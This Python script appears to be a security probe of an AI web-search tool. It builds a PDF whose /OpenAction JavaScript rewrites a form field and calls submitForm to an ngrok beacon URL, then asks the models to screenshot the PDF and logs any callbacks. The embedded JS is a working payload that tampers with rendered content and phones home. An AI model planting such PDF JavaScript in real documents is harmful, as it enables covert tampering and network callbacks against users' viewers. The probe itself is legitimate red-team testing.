#!/usr/bin/env python3
"""Probe whether OpenAI's PDF screenshot pipeline executes embedded PDF JavaScript.

Follow-up to the horrible thought: PDF has an Adobe-JavaScript API. If the
screenshot renderer runs it, embedded JS could (a) modify visible form-field
values before the raster is captured, and (b) fire network requests via
SubmitForm to a beacon URL.

Constructs a PDF with three probe surfaces:

  STATIC_PDF_TEXT_<hex>   drawn on page 1 via content stream; unconditional
  FORM_STATIC_<hex>       initial value (/V) of an AcroForm text field
  FORM_JS_MODIFIED_<hex>  what the field is set to by /OpenAction JavaScript;
                          only appears in the rendered field if JS ran

The /OpenAction JavaScript also calls submitForm(beacon_url). A beacon GET
proves the PDF JS ran and reached the network.

Requires: configured ngrok, Python 3, OPENAI_WEB_SEARCH_API_KEY.
Usage: python3 pdfjs_probe.py --out results/pdfjs-<ts>
"""

from __future__ import annotations

import argparse
import datetime
import json
import os
import secrets
import shutil
import subprocess
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlsplit


def utc() -> str:
    return datetime.datetime.now(datetime.timezone.utc).isoformat()


def save(path: Path, value) -> None:
    path.write_text(json.dumps(value, indent=2) + "\n")


def say(value) -> None:
    print(json.dumps(value), flush=True)


def build_pdf_with_js(static_text: str, form_default: str, form_js_value: str,
                      beacon_url: str) -> bytes:
    """Handcraft a PDF with a visible text field and an /OpenAction JS payload.

    The JS writes form_js_value into the field and calls submitForm(beacon_url).
    The field's initial /V is form_default; static_text is drawn beneath as an
    unconditional baseline. Field appearance stream is a bare identity so the
    displayed value follows /V.
    """
    def esc(s: str) -> str:
        return s.replace("\\", "\\\\").replace("(", r"\(").replace(")", r"\)")

    # Content stream: baseline visible text.
    cs = f"BT /F1 18 Tf 72 720 Td ({esc(static_text)}) Tj ET".encode()

    # JavaScript: set field value and submit to beacon.
    js_body = (
        f'try {{ this.getField("f1").value = "{form_js_value}"; }} catch(e) {{}}\n'
        f'try {{ this.submitForm({{cURL: "{beacon_url}?src=pdfjs", cSubmitAs: "HTML"}}); }} catch(e) {{}}\n'
    ).encode()

    objects = {}  # obj_num -> bytes body (between "N 0 obj\n" and "\nendobj\n")

    # 1. Catalog: references pages, opens with the JS action, has AcroForm.
    objects[1] = b"<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R /AcroForm 8 0 R >>"

    # 2. Pages
    objects[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"

    # 3. Page with content stream and one widget annotation (field 9).
    objects[3] = (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                  b"/Contents 5 0 R /Resources << /Font << /F1 4 0 R >> >> "
                  b"/Annots [9 0 R] >>")

    # 4. Font
    objects[4] = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"

    # 5. Content stream
    objects[5] = (b"<< /Length " + str(len(cs)).encode() +
                  b" >>\nstream\n" + cs + b"\nendstream")

    # 6. JavaScript stream
    js_stream = b"<< /Length " + str(len(js_body)).encode() + b" >>\nstream\n" + js_body + b"\nendstream"
    objects[6] = js_stream

    # 7. OpenAction: JavaScript action referencing the JS stream in 6.
    objects[7] = b"<< /Type /Action /S /JavaScript /JS 6 0 R >>"

    # 8. AcroForm dictionary referencing field 9.
    objects[8] = b"<< /Fields [9 0 R] /NeedAppearances true >>"

    # 9. Text form field (both field dict and widget annotation).
    #    /V (value) is what shows; /DV (default) mirrors it.
    field_body = (
        b"<< /Type /Annot /Subtype /Widget /FT /Tx /T (f1) "
        b"/V (" + esc(form_default).encode() + b") "
        b"/DV (" + esc(form_default).encode() + b") "
        b"/Rect [72 620 540 680] /P 3 0 R "
        b"/DA (/F1 16 Tf 0 0 0 rg) "
        b"/F 4 >>"
    )
    objects[9] = field_body

    # Assemble
    out = bytearray()
    out += b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
    offsets = {}
    for n in sorted(objects):
        offsets[n] = len(out)
        out += f"{n} 0 obj\n".encode() + objects[n] + b"\nendobj\n"

    xref_start = len(out)
    out += f"xref\n0 {max(objects) + 1}\n".encode()
    out += b"0000000000 65535 f \n"
    for n in sorted(objects):
        out += f"{offsets[n]:010d} 00000 n \n".encode()
    out += f"trailer\n<< /Size {max(objects) + 1} /Root 1 0 R >>\n".encode()
    out += f"startxref\n{xref_start}\n%%EOF\n".encode()
    return bytes(out)


class Server:
    def __init__(self, out: Path):
        self.out = out
        self.lock = threading.Lock()
        self.events: list[dict] = []
        self.public_url: str | None = None
        self.run_id = secrets.token_hex(8)
        self.pdf_path: str | None = None
        self.pdf_bytes: bytes | None = None
        self.beacon_path: str | None = None

    def register_pdf(self, pdf_bytes: bytes) -> tuple[str, str]:
        self.pdf_path = f"/probe/{self.run_id}/js.pdf"
        self.beacon_path = f"/beacon/{self.run_id}"
        self.pdf_bytes = pdf_bytes
        return self.pdf_path, self.beacon_path

    def _log(self, ts, handler, path, query, status, content_type, body_len):
        event = {
            "time": ts,
            "monotonic": time.monotonic(),
            "method": handler.command,
            "path": handler.path,
            "raw_path": path,
            "query": query,
            "status": status,
            "content_type": content_type,
            "user_agent": handler.headers.get("User-Agent"),
            "body_len": body_len,
            "source_ip": handler.client_address[0] if handler.client_address else None,
        }
        with self.lock:
            self.events.append(event)
            with (self.out / "http-events.jsonl").open("a") as f:
                f.write(json.dumps(event) + "\n")
        say({"http": {k: v for k, v in event.items() if k != "monotonic"}})

    def _handle(self, handler: BaseHTTPRequestHandler) -> None:
        split = urlsplit(handler.path)
        path = split.path
        query = split.query
        now = utc()

        # Also handle POST for submitForm (which POSTs by default).
        # We accept any method here.
        if path == self.pdf_path:
            body = self.pdf_bytes or b""
            handler.send_response(200)
            handler.send_header("Content-Type", "application/pdf")
            handler.send_header("Cache-Control", "no-store, no-cache, max-age=0")
            handler.send_header("Content-Length", str(len(body)))
            handler.end_headers()
            handler.wfile.write(body)
            self._log(now, handler, path, query, 200, "application/pdf", len(body))
            return

        if self.beacon_path and path.startswith(self.beacon_path):
            body = b"ok\n"
            handler.send_response(200)
            handler.send_header("Content-Type", "text/plain")
            handler.send_header("Access-Control-Allow-Origin", "*")
            handler.send_header("Content-Length", str(len(body)))
            handler.end_headers()
            handler.wfile.write(body)
            self._log(now, handler, path, query, 200, "text/plain", len(body))
            return

        handler.send_response(404)
        handler.send_header("Content-Length", "0")
        handler.end_headers()
        self._log(now, handler, path, query, 404, "text/plain", 0)

    def start(self, log_path: Path) -> ThreadingHTTPServer:
        server_ref = {"self": self}

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args): pass
            def do_GET(self): server_ref["self"]._handle(self)
            def do_HEAD(self): server_ref["self"]._handle(self)
            def do_POST(self):
                # Drain body but ignore payload.
                length = int(self.headers.get("Content-Length") or 0)
                if length:
                    self.rfile.read(length)
                server_ref["self"]._handle(self)

        server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        server.daemon_threads = True
        threading.Thread(target=server.serve_forever, daemon=True).start()
        port = server.server_address[1]

        self._tunnel_log = log_path.open("w")
        self._tunnel = subprocess.Popen(
            ["ngrok", "http", f"http://127.0.0.1:{port}",
             "--log", "stdout", "--log-format", "json", "--log-level", "info"],
            stdout=self._tunnel_log, stderr=subprocess.STDOUT)
        for _ in range(240):
            if self._tunnel.poll() is not None:
                raise RuntimeError("ngrok exited")
            for line in log_path.read_text().splitlines():
                try:
                    e = json.loads(line)
                except json.JSONDecodeError:
                    continue
                if e.get("msg") == "started tunnel" and str(e.get("url", "")).startswith("https://"):
                    self.public_url = e["url"].rstrip("/")
                    return server
            time.sleep(0.25)
        raise RuntimeError("no public URL")

    def stop(self, server: ThreadingHTTPServer) -> None:
        if getattr(self, "_tunnel", None) is not None:
            self._tunnel.terminate()
            try: self._tunnel.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self._tunnel.kill()
                self._tunnel.wait(timeout=5)
        if getattr(self, "_tunnel_log", None) is not None:
            self._tunnel_log.close()
        server.shutdown()
        server.server_close()


def api_call(out: Path, label: str, body: dict, key: str) -> dict:
    save(out / (label + ".request.json"), body)
    started = time.monotonic()
    record = {"label": label, "started_utc": utc(), "started_monotonic": started}
    say({"started": label, "model": body["model"]})
    try:
        req = urllib.request.Request(
            "https://api.openai.com/v1/responses",
            data=json.dumps(body).encode(), method="POST",
            headers={"Authorization": "Bearer " + key, "Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=300) as r:
            payload = r.read().decode()
            record["http_status"] = r.status
            record["request_id"] = r.headers.get("x-request-id")
            record["response"] = json.loads(payload.replace(key, "[REDACTED]"))
    except urllib.error.HTTPError as e:
        record["http_status"] = e.code
        record["error"] = e.read().decode().replace(key, "[REDACTED]")
    except Exception as e:
        record["error"] = str(e).replace(key, "[REDACTED]")
    record["ended_utc"] = utc()
    record["elapsed_s"] = round(time.monotonic() - started, 3)
    save(out / (label + ".response.json"), record)
    say({"completed": label, "http_status": record.get("http_status"),
         "elapsed_s": record["elapsed_s"], "error": record.get("error")})
    return record


def assistant_text(response: dict) -> str:
    parts = []
    for item in response.get("output", []) or []:
        if item.get("type") == "message":
            for c in item.get("content", []) or []:
                if c.get("type") == "output_text":
                    parts.append(c.get("text", ""))
    return "\n".join(parts)


def snippets_of(response: dict) -> str:
    parts = []
    for item in response.get("output", []) or []:
        if item.get("type") == "web_search_call":
            for r in item.get("results", []) or []:
                parts.append(r.get("snippet") or "")
                parts.append(r.get("title") or "")
    return "\n".join(parts)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out", type=Path, required=True)
    parser.add_argument("--models", nargs="+",
                        default=["gpt-6-astra", "gpt-5.6-luna"])
    args = parser.parse_args()

    key = os.environ.get("OPENAI_WEB_SEARCH_API_KEY")
    if not key:
        parser.error("OPENAI_WEB_SEARCH_API_KEY must be set")
    if not shutil.which("ngrok"):
        parser.error("ngrok must be installed and on PATH")
    args.out.mkdir(parents=True, exist_ok=False)

    static_text  = f"STATIC_PDF_TEXT_{secrets.token_hex(8)}"
    form_default = f"FORM_STATIC_{secrets.token_hex(8)}"
    form_js_val  = f"FORM_JS_MODIFIED_{secrets.token_hex(8)}"

    server = Server(args.out.resolve())
    try:
        srv = server.start(args.out / "ngrok.log")
        say({"public_url": server.public_url, "out": str(args.out)})
        beacon_url = server.public_url + f"/beacon/{server.run_id}"
        pdf_bytes = build_pdf_with_js(static_text, form_default, form_js_val,
                                       beacon_url)
        (args.out / "test.pdf").write_bytes(pdf_bytes)
        pdf_path, beacon_path = server.register_pdf(pdf_bytes)
        pdf_url = server.public_url + pdf_path

        save(args.out / "probe-markers.json", {
            "static_text": static_text,
            "form_default": form_default,
            "form_js_val": form_js_val,
            "beacon_url": beacon_url,
            "pdf_url": pdf_url,
        })

        summaries = []
        for model in args.models:
            model_dir = args.out / model
            model_dir.mkdir(exist_ok=True)
            body = {
                "model": model,
                "tools": [{"type": "web_search"}],
                "reasoning": {"effort": "low"},
                "store": True,
                "max_output_tokens": 4000,
                "max_tool_calls": 5,
                "include": ["web_search_call.results",
                            "reasoning.encrypted_content"],
                "instructions": (
                    "Open the PDF and take a screenshot of page 0. Report the "
                    "exact text you see in the screenshot verbatim, one string "
                    "per line. Also report the exact value shown in the form "
                    "text field (labelled 'f1'). If you see three marker "
                    "strings STATIC_PDF_TEXT, FORM_STATIC, and FORM_JS_MODIFIED, "
                    "list which are present and which are absent."
                ),
                "input": (f"Open {pdf_url} then take a screenshot of page 0. "
                          f"Report every marker string you see in the screenshot: "
                          f"STATIC_PDF_TEXT_*, FORM_STATIC_*, FORM_JS_MODIFIED_*. "
                          f"Also quote the current value of the text form field."),
            }
            start = time.monotonic()
            record = api_call(model_dir, f"pdf-js-{model}", body, key)
            r = record.get("response", {}) or {}
            text = assistant_text(r)
            snip = snippets_of(r)
            combined = snip + "\n" + text
            beacon_hits = [
                e for e in server.events
                if e["raw_path"].startswith(server.beacon_path or "/beacon/")
                and e["monotonic"] >= start - 0.5
            ]
            summaries.append({
                "model": model,
                "http_status": record.get("http_status"),
                "elapsed_s": record["elapsed_s"],
                "actions": [i.get("action") for i in r.get("output", []) or []
                            if i.get("type") == "web_search_call"],
                "static_text_present":  static_text  in combined,
                "form_default_present": form_default in combined,
                "form_js_val_present":  form_js_val  in combined,
                "beacon_hit_count": len(beacon_hits),
                "beacon_hits": [
                    {"path": e["path"], "query": e["query"],
                     "method": e["method"], "user_agent": e["user_agent"]}
                    for e in beacon_hits],
                "assistant_text": text,
                "snippet_first_400": snip[:400],
            })

        # Wait 30s for any late JS-triggered beacon (POST/GET from a viewer
        # that runs JS asynchronously).
        say({"waiting_for_late_beacons": 30})
        time.sleep(30)
        # Recount beacons after the wait
        for s in summaries:
            all_bh = [e for e in server.events
                      if e["raw_path"].startswith(server.beacon_path or "/beacon/")]
            s["beacon_hit_count_after_wait"] = len(all_bh)
        save(args.out / "summary.json", summaries)
        say({"done": True, "out": str(args.out)})
    finally:
        try:
            server.stop(srv)  # noqa: F821
        except Exception:
            pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
